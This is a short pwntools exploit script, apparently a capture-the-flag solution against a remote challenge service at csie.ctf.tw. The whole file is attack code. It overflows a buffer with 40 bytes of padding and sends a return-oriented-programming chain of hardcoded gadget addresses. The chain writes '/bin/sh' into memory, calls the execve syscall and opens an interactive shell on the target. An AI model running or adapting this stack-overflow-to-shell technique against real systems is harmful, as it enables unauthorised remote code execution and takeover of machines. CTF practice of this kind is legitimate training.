from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10130

r = remote(host, port)

# input('Press enter to continue.')

# write /bin/sh
payload = b'a'*40
mov_drdi_rsi = 0x000000000047a502
pop_rdi = 0x0000000000401456
pop_rsi = 0x0000000000401577
buf = 0x6c9a20

pop_rax_rdx_rbx = 0x0000000000478516
syscall = 0x00000000004671b5

rop = flat([pop_rdi, buf, pop_rsi, '/bin/sh\x00', mov_drdi_rsi, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, syscall])
r.recvuntil(':')
r.sendline(payload + rop)

r.interactive()
